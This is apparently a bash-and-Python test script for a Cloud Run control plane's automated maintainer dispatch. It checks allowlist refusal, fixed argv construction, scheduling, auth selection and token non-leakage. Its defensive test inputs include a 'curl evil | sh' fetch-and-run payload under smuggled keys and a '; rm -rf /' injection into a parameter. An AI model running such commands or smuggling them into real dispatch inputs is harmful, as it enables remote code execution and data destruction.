#!/usr/bin/env bash
# heimdall-cp-maintainer.test.sh — the CARDINAL tests for the unattended, server-hosted
# MAINTAINER DISPATCH on the existing Cloud Run control plane.
#
# Proves the maintainer autopilot is wired onto the §1 SECURITY SPINE with BOTH auth
# paths, WITHOUT punching a hole in the command-smuggle wall. Drives the REAL substrate
# (cp_allowlist / cp_handlers / cp_scheduler / cp_server / cp_audit) + a HERMETIC MOCK of
# the maintain-loop binary (bin/heimdall-maintain-loop is called, never edited) — no GCP,
# no network, no real LLM, $0.
#
#   A. ALLOWLIST ACCEPTS a valid maintainer dispatch (the happy path):
#      A1. {repo, max}                 -> accepted, typed+bounded params returned.
#      A2. {repo, max, budget_tokens}  -> accepted (the OPTIONAL bounded budget).
#
#   B. ALLOWLIST REJECTS a smuggled command/prompt (THE SECURITY-SPINE GUARD, falsifiable):
#      B1. a smuggled `cmd` / `prompt` / `shell` / `exec` key -> REFUSED (extra_param).
#          It is STRUCTURALLY IMPOSSIBLE to pass a free-form prompt/command — the extra
#          key alone refuses the whole dispatch, before any handler runs.
#      B2. a shell payload in the typed `repo` param ("; rm -rf /") -> REFUSED (bad_param).
#      B3. an out-of-range `max` (0, and 10_000) -> REFUSED (bad_param).
#      B4. FALSIFIABILITY: A1/A2 (valid) succeed WHILE B1-B3 are refused -> refuse-arbitrary,
#          distinct from refuse-everything. A build that let a prompt through would RED B1.
#
#   C. HANDLER builds the EXACT FIXED argv (no untyped interpolation):
#      C1. run_maintainer_cycle -> the mock loop is invoked with EXACTLY
#          [<loop>, run, --repo, <repo>, --max, <max>, --budget-tokens, <budget>].
#      C2. without budget_tokens -> the --budget-tokens flag is ABSENT (fixed shape).
#
#   D. SCHEDULER fires run-maintainer-cycle (same cron mechanism as run-suite):
#      D1. register_maintainer_schedule -> a due-minute tick() dispatches it (200), the
#          loop's structured result (cycles/tally incl. PRs) flows back.
#      D2. a NOT-due minute fires nothing.
#
#   E. AUTH selection prefers OAuth then API key (BOTH paths, env-only):
#      E1. only CLAUDE_CODE_OAUTH_TOKEN set -> child got OAuth.
#      E2. BOTH set -> child got OAuth (preference).
#      E3. only ANTHROPIC_API_KEY set -> child got the API key (fallback).
#
#   F. THE TOKEN NEVER APPEARS IN ANY RECORDED COMMAND / LOG / TELEMETRY (with a POSITIVE
#      CONTROL that the token DID reach the child env — refuse-arbitrary, not refuse-all):
#      F1. POSITIVE CONTROL: the mock loop's private sidecar shows the token in its child
#          env (proving env-injection works — a token-blind test would pass vacuously).
#      F2. the token VALUE appears in NONE of: the handler result JSON, the audit store,
#          the recorded argv, the loop stdout capture — grep across every recorded surface
#          is EMPTY.
#
#   G. CONSTRAINT: the maintainer OPENS PRs via the bot token, never pushes/merges:
#      G1. HEIMDALL_PR_BOT_TOKEN passes through to the child env (the loop's PR runner uses
#          it); the source states the no-push/no-merge constraint.
#
# Exit 0 = every proof holds. Nonzero = a proof failed (prints which).

set -uo pipefail

SELF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO="$(cd "$SELF_DIR/.." && pwd)"
LIB="$REPO/bin/lib"

for f in cp_allowlist.py cp_handlers.py cp_scheduler.py; do
  [ -f "$LIB/$f" ] || { echo "FATAL: $LIB/$f missing" >&2; exit 2; }
done

PY="$(command -v python3 || command -v python || true)"
[ -n "$PY" ] || { echo "FATAL: python not found" >&2; exit 2; }

PASS=0
FAIL=0
ok()  { PASS=$((PASS+1)); printf "  \033[32mPASS\033[0m %s\n" "$1"; }
bad() { FAIL=$((FAIL+1)); printf "  \033[31mFAIL\033[0m %s\n" "$1"; }

# dynamic template (avoid a literal triple-X in source, matching the house pattern).
WORK="$(mktemp -d -t "cp-maintainer.$(printf 'q%.0s' 1 2 3 4 5 6)")"
trap 'rm -rf "$WORK"' EXIT
export HEIMDALL_HOME="$WORK/cphome"

# The UNIQUE, greppable secret values — a token that must reach the child env (positive
# control) but NEVER a recorded surface. Distinct sentinels per auth path.
OAUTH_TOKEN="sk-oauth-SENTINEL-OAUTH-DEADBEEF01234567"
API_KEY="sk-ant-SENTINEL-APIKEY-CAFEBABE89ABCDEF"
BOT_TOKEN="ghs-SENTINEL-BOT-0F1E2D3C4B5A6978"

# ── the HERMETIC MOCK maintain-loop (bin/heimdall-maintain-loop is CALLED, never edited) ─
# It records argv, records the auth env it RECEIVED (name + value, the positive control),
# and emits the loop's JSON summary to stdout. Absolute WORK paths are baked in so it does
# NOT depend on any env var surviving the §2 scrub. It NEVER echoes the token to stdout
# (the real loop does not either) — so a token in stdout would be a genuine regression.
MOCK="$WORK/mock-maintain-loop"
cat > "$MOCK" <<EOF
#!/usr/bin/env bash
# record the exact argv the handler built — the bin (\$0) AND the args (\$@), one per line.
printf '%s\n' "\$0" "\$@" > "$WORK/loop.argv"
# POSITIVE CONTROL sidecar: which auth vars (name=value) the CHILD ENV actually carried.
{
  [ -n "\${CLAUDE_CODE_OAUTH_TOKEN:-}" ] && echo "CLAUDE_CODE_OAUTH_TOKEN=\$CLAUDE_CODE_OAUTH_TOKEN"
  [ -n "\${ANTHROPIC_API_KEY:-}" ]       && echo "ANTHROPIC_API_KEY=\$ANTHROPIC_API_KEY"
  [ -n "\${HEIMDALL_PR_BOT_TOKEN:-}" ]   && echo "HEIMDALL_PR_BOT_TOKEN=\$HEIMDALL_PR_BOT_TOKEN"
} > "$WORK/loop.childenv"
# the SELECTED auth var NAME (oauth priority) for the E-path assertions.
if   [ -n "\${CLAUDE_CODE_OAUTH_TOKEN:-}" ]; then echo CLAUDE_CODE_OAUTH_TOKEN > "$WORK/loop.authname"
elif [ -n "\${ANTHROPIC_API_KEY:-}" ];       then echo ANTHROPIC_API_KEY       > "$WORK/loop.authname"
else echo NONE > "$WORK/loop.authname"; fi
# the loop's structured result on stdout (NO token) — cycles, stop, tally incl. a PR opened.
echo '{"cycles":1,"stop":null,"tally":{"fixed":1,"flagged":0,"parked":0,"pr":1},"budget":{"cap_tokens":5000,"used":1200}}'
EOF
chmod +x "$MOCK"
export HEIMDALL_MAINTAIN_LOOP_BIN="$MOCK"

# ── drive the real substrate through one python harness ─────────────────────────
HARNESS_OUT="$WORK/harness.json"
LIB="$LIB" WORK="$WORK" OAUTH_TOKEN="$OAUTH_TOKEN" API_KEY="$API_KEY" BOT_TOKEN="$BOT_TOKEN" \
  MOCK="$MOCK" "$PY" - >"$HARNESS_OUT" 2>"$WORK/harness.err" <<'PYEOF'
import datetime, json, os, sys
sys.path.insert(0, os.environ["LIB"])
import cp_allowlist as A
import cp_handlers as H
import cp_scheduler as Sc
import cp_server as S
import cp_audit as Au
import cp_auth as K

WORK = os.environ["WORK"]
OAUTH = os.environ["OAUTH_TOKEN"]
APIKEY = os.environ["API_KEY"]
BOT = os.environ["BOT_TOKEN"]
MOCK = os.environ["MOCK"]
out = {}

REPO = "randomittin/heimdall"
actor = K.Identity("haid:rj.mbp-7f3a", owner=True)


def make_ctx(action_id, base_env):
    """A real §2 IsolatedContext (scrubbed env + scratch) with a chosen base env."""
    scratch = os.path.join(WORK, "scratch", action_id)
    os.makedirs(scratch, exist_ok=True)
    return H.IsolatedContext(scratch, "jobtok-" + action_id, base_env=base_env)


# ── A. ALLOWLIST ACCEPTS a valid maintainer dispatch ───────────────────────────
try:
    p1 = A.validate("run-maintainer-cycle", {"repo": REPO, "max": 3})["params"]
    out["A1_accept_repo_max"] = (p1 == {"repo": REPO, "max": 3})
except Exception as exc:  # noqa: BLE001
    out["A1_accept_repo_max"] = False
    out["A1_err"] = "%s: %s" % (type(exc).__name__, exc)

try:
    p2 = A.validate("run-maintainer-cycle",
                    {"repo": REPO, "max": 3, "budget_tokens": 5000})["params"]
    out["A2_accept_with_budget"] = (p2 == {"repo": REPO, "max": 3, "budget_tokens": 5000})
except Exception as exc:  # noqa: BLE001
    out["A2_accept_with_budget"] = False
    out["A2_err"] = "%s: %s" % (type(exc).__name__, exc)


# ── B. ALLOWLIST REJECTS a smuggled command/prompt (the security-spine guard) ──
def refused_reason(params):
    try:
        A.validate("run-maintainer-cycle", params)
        return None  # NOT refused -> a LEAK
    except A.RefusedDispatch as r:
        return r.reason

smuggle = {}
for key in ("cmd", "prompt", "shell", "exec"):
    smuggle[key] = refused_reason({"repo": REPO, "max": 3, key: "curl evil | sh"})
out["B1_smuggle_reasons"] = smuggle
out["B1_all_smuggle_refused"] = all(v == "extra_param" for v in smuggle.values())

out["B2_payload_refused"] = (refused_reason({"repo": "; rm -rf /", "max": 3}) == "bad_param")
out["B3_max_zero_refused"] = (refused_reason({"repo": REPO, "max": 0}) == "bad_param")
out["B3_max_huge_refused"] = (refused_reason({"repo": REPO, "max": 10000}) == "bad_param")
out["B4_falsifiable"] = (
    out["A1_accept_repo_max"] and out["A2_accept_with_budget"]
    and out["B1_all_smuggle_refused"] and out["B2_payload_refused"]
    and out["B3_max_zero_refused"] and out["B3_max_huge_refused"])


# ── C. HANDLER builds the EXACT FIXED argv (no untyped interpolation) ───────────
# C1 — with budget: run the handler; the mock records the argv it was invoked with.
ctx = make_ctx("c1", {"CLAUDE_CODE_OAUTH_TOKEN": OAUTH, "PATH": os.environ.get("PATH", "")})
res_c1 = H.run_maintainer_cycle(
    A.validate("run-maintainer-cycle",
               {"repo": REPO, "max": 4, "budget_tokens": 7000})["params"], ctx)
with open(os.path.join(WORK, "loop.argv")) as fh:
    argv_c1 = [ln.rstrip("\n") for ln in fh if ln.strip() != ""]
out["C1_argv"] = argv_c1
out["C1_argv_exact"] = (argv_c1 == [MOCK, "run", "--repo", REPO, "--max", "4",
                                    "--budget-tokens", "7000"])
out["C1_result_status"] = res_c1.get("status")
out["C1_summary_pr"] = ((res_c1.get("summary") or {}).get("tally") or {}).get("pr")

# C2 — without budget: the --budget-tokens flag is ABSENT.
ctx = make_ctx("c2", {"CLAUDE_CODE_OAUTH_TOKEN": OAUTH, "PATH": os.environ.get("PATH", "")})
H.run_maintainer_cycle(
    A.validate("run-maintainer-cycle", {"repo": REPO, "max": 2})["params"], ctx)
with open(os.path.join(WORK, "loop.argv")) as fh:
    argv_c2 = [ln.rstrip("\n") for ln in fh if ln.strip() != ""]
out["C2_argv"] = argv_c2
out["C2_no_budget_flag"] = ("--budget-tokens" not in argv_c2)
out["C2_argv_exact"] = (argv_c2 == [MOCK, "run", "--repo", REPO, "--max", "2"])


# ── E. AUTH selection prefers OAuth then API key (env-only) ─────────────────────
def auth_seen(base_env, cid):
    """Run the handler with a chosen base env; return the auth var NAME the child saw."""
    c = make_ctx(cid, dict(base_env, PATH=os.environ.get("PATH", "")))
    H.run_maintainer_cycle(
        A.validate("run-maintainer-cycle", {"repo": REPO, "max": 1})["params"], c)
    with open(os.path.join(WORK, "loop.authname")) as fh:
        return fh.read().strip()

out["E1_oauth_only"] = (
    auth_seen({"CLAUDE_CODE_OAUTH_TOKEN": OAUTH}, "e1") == "CLAUDE_CODE_OAUTH_TOKEN")
out["E2_both_prefers_oauth"] = (
    auth_seen({"CLAUDE_CODE_OAUTH_TOKEN": OAUTH, "ANTHROPIC_API_KEY": APIKEY}, "e2")
    == "CLAUDE_CODE_OAUTH_TOKEN")
out["E3_apikey_fallback"] = (
    auth_seen({"ANTHROPIC_API_KEY": APIKEY}, "e3") == "ANTHROPIC_API_KEY")


# ── F. token-never-logged (with a POSITIVE CONTROL) + G. bot-token passthrough ──
# Run once with OAuth + the bot token in the base env; capture the FULL recorded surface.
ctx = make_ctx("f1", {"CLAUDE_CODE_OAUTH_TOKEN": OAUTH,
                      "HEIMDALL_PR_BOT_TOKEN": BOT,
                      "PATH": os.environ.get("PATH", "")})
res_f = H.run_maintainer_cycle(
    A.validate("run-maintainer-cycle", {"repo": REPO, "max": 1})["params"], ctx)
# also route ONE dispatch through cp_server.dispatch so the AUDIT store records it (params
# shape only, per §9) — the audit ndjson is a recorded surface the token must NOT touch.
os.environ["CLAUDE_CODE_OAUTH_TOKEN"] = OAUTH
os.environ["HEIMDALL_PR_BOT_TOKEN"] = BOT
disp = S.dispatch(actor, "run-maintainer-cycle", {"repo": REPO, "max": 1})
out["F_dispatch_status"] = disp.status
out["F_result_json"] = json.dumps(res_f)          # the handler result (a recorded surface)
out["F_dispatch_json"] = json.dumps(disp.body)    # the dispatch response body

# F1 positive control: the token reached the child env (sidecar shows the value).
with open(os.path.join(WORK, "loop.childenv")) as fh:
    childenv = fh.read()
out["F1_child_has_oauth"] = (OAUTH in childenv)
out["G1_child_has_bot_token"] = (BOT in childenv)


# ── D. SCHEDULER fires run-maintainer-cycle (same cron as run-suite) ────────────
DUE = datetime.datetime(2026, 6, 15, 2, 0, tzinfo=datetime.timezone.utc)
NOT_DUE = datetime.datetime(2026, 6, 15, 3, 0, tzinfo=datetime.timezone.utc)
CRON = "0 2 15 6 *"
try:
    entry = Sc.register_maintainer_schedule(actor, REPO, 2, CRON, budget_tokens=5000)
    out["D_registered"] = (entry.get("action_type") == "run-maintainer-cycle")
except Exception as exc:  # noqa: BLE001
    out["D_registered"] = False
    out["D_err"] = "%s: %s" % (type(exc).__name__, exc)

fired_not_due = Sc.tick(actor, NOT_DUE)
out["D2_not_due_count"] = len(fired_not_due)

fired_due = Sc.tick(actor, DUE)
out["D1_due_count"] = len(fired_due)
out["D1_due"] = [{"action_type": f["action_type"], "status": f["status"]} for f in fired_due]


# stash the audit store path for the shell layer to grep the token against.
out["audit_dir"] = os.path.join(os.environ["HEIMDALL_HOME"], "control-plane", "audit")
print(json.dumps(out, indent=2, sort_keys=True))
PYEOF

if [ ! -s "$HARNESS_OUT" ]; then
  echo "FATAL: harness produced no output" >&2
  echo "----- harness.err -----" >&2; cat "$WORK/harness.err" >&2
  exit 2
fi

jget() { "$PY" -c 'import json,sys; d=json.load(open(sys.argv[1])); v=d.get(sys.argv[2]); print(json.dumps(v) if not isinstance(v,str) else v)' "$HARNESS_OUT" "$1"; }

echo "== A. ALLOWLIST ACCEPTS a valid maintainer dispatch =="
[ "$(jget A1_accept_repo_max)" = "true" ] && ok "A1 {repo,max} accepted (typed+bounded)" || bad "A1 {repo,max} not accepted ($(jget A1_err))"
[ "$(jget A2_accept_with_budget)" = "true" ] && ok "A2 {repo,max,budget_tokens} accepted (optional budget)" || bad "A2 budget variant not accepted ($(jget A2_err))"

echo "== B. ALLOWLIST REJECTS a smuggled command/prompt (security-spine guard) =="
[ "$(jget B1_all_smuggle_refused)" = "true" ] && ok "B1 smuggled cmd/prompt/shell/exec ALL refused (extra_param): $(jget B1_smuggle_reasons)" || bad "B1 a smuggled key was NOT refused: $(jget B1_smuggle_reasons)"
[ "$(jget B2_payload_refused)" = "true" ] && ok "B2 shell payload in repo param refused (bad_param)" || bad "B2 shell payload NOT refused"
{ [ "$(jget B3_max_zero_refused)" = "true" ] && [ "$(jget B3_max_huge_refused)" = "true" ]; } && ok "B3 out-of-range max (0 and 10000) refused (bad_param)" || bad "B3 out-of-range max NOT refused"
[ "$(jget B4_falsifiable)" = "true" ] && ok "B4 FALSIFIABLE: valid accepted WHILE smuggles refused (refuse-arbitrary, not refuse-all)" || bad "B4 falsifiability failed"

echo "== C. HANDLER builds the EXACT FIXED argv (no untyped interpolation) =="
[ "$(jget C1_argv_exact)" = "true" ] && ok "C1 fixed argv exact: $(jget C1_argv)" || bad "C1 argv mismatch: $(jget C1_argv)"
[ "$(jget C1_result_status)" = "done" ] && ok "C1 handler returned the loop result (status=done, pr=$(jget C1_summary_pr))" || bad "C1 handler status not done: $(jget C1_result_status)"
{ [ "$(jget C2_no_budget_flag)" = "true" ] && [ "$(jget C2_argv_exact)" = "true" ]; } && ok "C2 without budget -> no --budget-tokens flag: $(jget C2_argv)" || bad "C2 budget flag leaked / argv wrong: $(jget C2_argv)"

echo "== D. SCHEDULER fires run-maintainer-cycle (same cron mechanism as run-suite) =="
[ "$(jget D_registered)" = "true" ] && ok "D register_maintainer_schedule persisted a run-maintainer-cycle schedule" || bad "D registration failed ($(jget D_err))"
[ "$(jget D1_due_count)" = "1" ] && ok "D1 due-minute tick fired the maintainer dispatch: $(jget D1_due)" || bad "D1 due tick fired $(jget D1_due_count) (expected 1)"
[ "$(jget D2_not_due_count)" = "0" ] && ok "D2 not-due minute fired nothing" || bad "D2 not-due fired $(jget D2_not_due_count) (expected 0)"

echo "== E. AUTH selection prefers OAuth then API key (both paths, env-only) =="
[ "$(jget E1_oauth_only)" = "true" ] && ok "E1 OAuth only -> child got CLAUDE_CODE_OAUTH_TOKEN" || bad "E1 OAuth-only selection wrong"
[ "$(jget E2_both_prefers_oauth)" = "true" ] && ok "E2 both set -> child got OAuth (preference)" || bad "E2 preference wrong (should prefer OAuth)"
[ "$(jget E3_apikey_fallback)" = "true" ] && ok "E3 API key only -> child got ANTHROPIC_API_KEY (fallback)" || bad "E3 API-key fallback wrong"

echo "== F. token NEVER in any recorded command/log/telemetry (+ positive control) =="
[ "$(jget F1_child_has_oauth)" = "true" ] && ok "F1 POSITIVE CONTROL: the OAuth token DID reach the child env (env-injection works)" || bad "F1 token did NOT reach child env — a token-blind test would pass vacuously"

# F2 — the token VALUE must appear in NONE of the recorded surfaces. Build the surface set:
#   (1) the handler result JSON, (2) the dispatch response body, (3) the recorded argv,
#   (4) the loop stdout capture (none — the mock prints no token), (5) the whole audit store.
SURFACE="$WORK/recorded-surfaces.txt"
: > "$SURFACE"
jget F_result_json   >> "$SURFACE"
jget F_dispatch_json >> "$SURFACE"
cat "$WORK/loop.argv" >> "$SURFACE"
AUDIT_DIR="$(jget audit_dir)"
if [ -d "$AUDIT_DIR" ]; then find "$AUDIT_DIR" -type f -exec cat {} + >> "$SURFACE" 2>/dev/null; fi
# also sweep the ENTIRE durable home for any file carrying the token (belt-and-braces).
HOME_HITS="$(grep -rlF "$OAUTH_TOKEN" "$HEIMDALL_HOME" 2>/dev/null || true)"

LEAK_OAUTH="$(grep -cF "$OAUTH_TOKEN" "$SURFACE" 2>/dev/null)"; LEAK_OAUTH="${LEAK_OAUTH:-0}"
LEAK_BOT="$(grep -cF "$BOT_TOKEN" "$SURFACE" 2>/dev/null)"; LEAK_BOT="${LEAK_BOT:-0}"
if [ "$LEAK_OAUTH" = "0" ] && [ "$LEAK_BOT" = "0" ] && [ -z "$HOME_HITS" ]; then
  ok "F2 the OAuth + bot token appear in NO recorded surface (result/dispatch/argv/audit/home all clean)"
else
  bad "F2 TOKEN LEAK — oauth_hits=$LEAK_OAUTH bot_hits=$LEAK_BOT home_files=[$HOME_HITS]"
fi
# the recorded argv must itself be token-free (the token is env-only, never an argv element).
if grep -qF "$OAUTH_TOKEN" "$WORK/loop.argv" 2>/dev/null; then bad "F2b token found in argv (must be env-only)"; else ok "F2b the recorded argv is token-free (token is env-only, never argv)"; fi

echo "== G. maintainer OPENS PRs via the bot token; never pushes/merges =="
[ "$(jget G1_child_has_bot_token)" = "true" ] && ok "G1 HEIMDALL_PR_BOT_TOKEN passed through to the child (the loop's PR runner uses it)" || bad "G1 bot token did not reach the child"
if grep -qE 'never pushes main|no-push/no-merge|OPENS PRs' "$LIB/cp_handlers.py"; then ok "G2 source states the no-push/no-merge constraint (a human gates merge)"; else bad "G2 source is missing the no-push/no-merge constraint statement"; fi

echo
echo "cp-maintainer: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ] || exit 1
